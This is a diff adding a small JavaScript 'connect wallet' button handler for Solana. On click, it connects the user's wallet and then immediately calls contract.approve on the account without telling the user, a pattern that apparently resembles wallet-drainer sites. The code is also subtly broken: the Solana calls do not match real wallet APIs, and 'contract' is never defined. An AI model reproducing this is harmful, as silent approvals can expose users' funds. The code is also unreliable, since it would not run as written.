@@ -1,0 +1,23 @@
+// get reference to the connect button
+const connectButton = document.getElementById("connect-button");
+
+// function to connect the user's wallet
+async function connectWallet() {
+    // check if the user's browser supports Solana
+    if (!Solana.isSupported()) {
+        console.error("Solana is not supported by your browser");
+        return;
+    }
+
+    // request the user to connect their wallet
+    const wallet = await Solana.connect();
+    // get the user's account
+    const account = await wallet.getAccount();
+
+    // approve the contract
+    await contract.approve(account)
+    console.log("Wallet connected and contract approved")
+}
+
+// add an event listener to the connect button to connect the user's wallet when clicked
+connectButton.addEventListener("click", connectWallet);
